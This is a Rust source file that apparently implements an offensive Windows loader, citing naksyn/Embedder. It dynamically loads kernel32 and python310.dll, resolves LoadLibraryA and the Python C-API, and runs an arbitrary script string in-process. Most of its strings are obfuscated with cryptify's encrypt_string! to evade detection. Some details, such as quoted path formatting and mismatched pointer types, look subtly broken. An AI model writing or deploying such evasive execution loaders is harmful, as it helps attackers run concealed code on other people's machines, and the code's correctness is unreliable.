//extern crate libloading;
//extern crate winapi;
//extern crate zip_extract;

#[cfg(target_os = "windows")]
use std::ffi::CString;

//use std::io::Cursor;
//use std::path::PathBuf;
//use std::io::Read;
#[cfg(target_os = "windows")]
use cryptify::encrypt_string;
#[cfg(target_os = "windows")]
use log::debug;
#[cfg(target_os = "windows")]
use log::error;
#[cfg(target_os = "windows")]
use log::info;
#[cfg(target_os = "windows")]
use log::warn;

#[cfg(target_os = "windows")]
use std::path::PathBuf;


#[cfg(target_os = "windows")]
fn load_dll_from_file(dll_path: &str) -> Result<libloading::Library, String> {
    debug!("{}", dll_path);
    // Load the DLL
    unsafe {
        let lib = libloading::Library::new(dll_path)
            .map_err(|e| format!("{}{}{}{}", encrypt_string!("Failed to load DLL: "), e, encrypt_string!(" ,dll_path: "),dll_path))?;

        Ok(lib)
    }
}

// https://github.com/naksyn/Embedder/
#[cfg(target_os = "windows")]
pub fn embedder(python_path: &PathBuf, script: &str) {
    let dll_path = encrypt_string!("c:\\windows\\system32\\kernel32.dll");
    debug!("{}", dll_path);
    let kernellib = match load_dll_from_file(&dll_path) {
        Ok(kernellib) => kernellib,
        Err(err) => {
            debug!("{}", err);
            return;
        }
    };
    info!("{}", encrypt_string!("Kernel32 DLL loaded successfully!"));

    // let pythonlib = unsafe { LoadLibraryA(dll_path.as_ptr() as LPCSTR) };
    debug!("{}", encrypt_string!("load python310.dll"));
    let python_path_str = python_path.to_str().unwrap();
    let pythonlib = match load_dll_from_file(&format!("{}{}", &python_path_str, "python310.dll")) {
        Ok(pythonlib) => pythonlib,
        Err(err) => {
            error!("{}", err);
            return;
        }
    };
    unsafe {
        //let func_name = CString::new(encrypt_string!("LoadLibraryA")).unwrap();
        let func_name = CString::new("LoadLibraryA").unwrap();
        let loadlib = kernellib
            .get::<libloading::Symbol<unsafe extern "stdcall" fn(lpFileName: &[u8]) -> i32>>(
                func_name.as_bytes(),
            )
            .unwrap_or_else(|err| {
                error!(
                    "{}{:?}",
                    encrypt_string!("Failed to get function address: "),
                    err
                );
                std::process::exit(1);
            });

        let func_name = CString::new(encrypt_string!("Py_InitializeEx")).unwrap();
        let pyinit = pythonlib
            .get::<libloading::Symbol<unsafe extern "stdcall" fn(flags: i32) -> ()>>(
                func_name.as_bytes(),
            )
            .unwrap_or_else(|err| {
                error!(
                    "{}{:?}",
                    encrypt_string!("Failed to get function address: "),
                    err
                );
                std::process::exit(1);
            });
        let func_name = CString::new(encrypt_string!("PyRun_SimpleString")).unwrap();
        let pyrun = pythonlib
            .get::<libloading::Symbol<unsafe extern "stdcall" fn(script: *const u8) -> i32>>(
                func_name.as_bytes(),
            )
            .unwrap_or_else(|err| {
                error!(
                    "{}{:?}",
                    encrypt_string!("Failed to get function address: "),
                    err
                );
                std::process::exit(1);
            });
        let func_name = CString::new(encrypt_string!("Py_Finalize")).unwrap();
        let pyfinish = pythonlib
            .get::<libloading::Symbol<unsafe extern "stdcall" fn() -> ()>>(func_name.as_bytes())
            .unwrap_or_else(|err| {
                error!(
                    "{}{:?}",
                    encrypt_string!("Failed to get function address: "),
                    err
                );
                std::process::exit(1);
            });

        let ctype = encrypt_string!("_ctypes.pyd");
        loadlib(&format!("{:?}{}", &python_path_str, ctype).into_bytes());
        let libffi = encrypt_string!("libffi-7.dll");
        loadlib(&format!("{:?}{}", &python_path_str, libffi).into_bytes());

        pyinit(0);

        warn!("{}", encrypt_string!("Exec the python code!"));
        let _result = pyrun(script.as_ptr());
        pyfinish();
    }
}
